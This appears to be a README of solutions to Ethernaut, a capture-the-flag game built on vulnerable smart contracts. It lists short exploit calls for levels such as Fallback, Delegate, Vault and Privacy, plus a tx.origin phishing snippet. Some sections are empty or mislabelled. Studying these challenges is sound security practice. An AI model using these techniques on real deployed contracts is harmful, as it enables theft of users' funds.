# Ethernaut Solution

This repository contains solutions to various Ethernaut challenges. Each challenge is addressed with the necessary steps to exploit vulnerabilities and solve the levels.

## 1. Hello Ethernaut
Contract: `0xeF08E3A4FF2e36f81D0a746947C4bd68BB1A67e9`
```javascript
await contract.password();
await contract.authenticate('ethernaut0');
```

## 2. Fallback
Contract: `0x12c6202f6911b88781c04986F4aB65e58b9A0585`
1. Contribute some amount of ETH using the `contribute()` function:
   ```javascript
   await contract.contribute.sendTransaction({ value: toWei(".00001") });
   ```
2. Send some ETH to the contract (CALLDATA) to trigger the `receive()` method and satisfy the `require` condition, changing the owner:
   ```javascript
   await contract.sendTransaction({ value: toWei(".0001") });
   ```
3. Withdraw to reduce the contract's balance to 0:
   ```javascript
   await contract.withdraw();
   ```

## 3. Fallout
Contract: `0x1D34c5e3320f5D9bc5fC8079685C5F2fb1a54B8f`
```javascript
await contract.Fal1out();
```
The story of Rubixi illustrates the importance of proper naming in constructors. Changing a contract's name without renaming the constructor can lead to vulnerabilities, as seen in the Rubixi case where the constructor was not renamed, allowing attackers to claim ownership.

## 4. Coin Flip
Generating random numbers in Solidity is tricky due to the visibility of contract data and miners' ability to manipulate certain values. Using Chainlink VRF or other methods like Bitcoin block headers, RANDAO, or Oraclize can provide more secure randomness.

## 5. Telephone
Contract: `0xb17c2d73Bb8FfBF052a2d441ef6758285eabFCa8`
Confusing `tx.origin` with `msg.sender` can lead to phishing attacks. Example attack steps:
1. Use `tx.origin` to determine whose tokens to transfer:
   ```javascript
   function transfer(address _to, uint _value) {
       tokens[tx.origin] -= _value;
       tokens[_to] += _value;
   }
   ```
2. Attacker tricks victim into sending funds to a malicious contract:
   ```javascript
   function () payable {
       token.transfer(attackerAddress, 10000);
   }
   ```
3. In this scenario, `tx.origin` is the victim’s address, causing funds to be transferred to the attacker.

## 6. Token
Contract: `0xC16237e24c6A1377b8A0a41e520c7D1E5c122863`
```javascript
await contract.transfer("address", 21);
```
Overflows are common in Solidity and should be checked with control statements or by using OpenZeppelin's SafeMath library to prevent overflows.

## 7. Delegate
Contract: `0xE1F15e570836872154aaaF1aA4B2D867c0b0264c`
`abi.encodeWithSignature("pwn()")` is `dd365b8b`.
```javascript
await contract.sendTransaction({ from: player, data: "dd365b8b" });
```

## 8. Force
Contract: `0x32f8DCA769F10B9466b71f3FCBd3EC7258700c1a`
A contract can receive Ether even without a payable fallback function through self-destruction. Thus, don’t rely on `address(this).balance == 0` for contract logic.

## 9. Vault
Contract: `0xdFF1a558c01ee357a27E1AbF825d4bCfD6a00C9B`
```javascript
web3.eth.getStorageAt(contractAddress, 1, (e, v) => console.log(web3.utils.toAscii(v)));
web3.eth.getStorageAt(contractAddress, 1);
await contract.unlock(web3.eth.getStorageAt(contractAddress, 1));
// or
await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29');
```

## 10. King
Contract: `0x6848C1951fB6bb65d5168B2609820DEB3F6b4b48`

## 11. [Level Unspecified]

## 12. Elevator
Contract: `0x6Cf4882c86753a32B03c9343Ba80B3A6f5BB6117`
Use the `view` function modifier to prevent state modifications:
```solidity
function isLastFloor(uint floor) public view returns (bool) {
    // implementation
}
```
An alternative is to build a view function that returns different results based on input data without modifying the state.

## 13. Privacy
Contract: `0x55E4Ef0F53b13AbF16384827dAD6C385ce5c58b7`
```javascript
const keyData = await web3.eth.getStorageAt(contract.address, 5, console.log);
const key16 = keyData.slice(0, 34);
```

## 14. GatekeeperOne

## 16. NaughtCoin
Contract: `0x53732c8ef2867d6855598ACD7D7aBd0C48Cc0637`
Understand ERC20 tokens and their functions. Use `allow` and `transferFrom` to transfer tokens due to inheritance from ERC20.

## 22. Shop
Contracts can manipulate data seen by other contracts. Avoid changing state based on external, untrusted contract logic.

---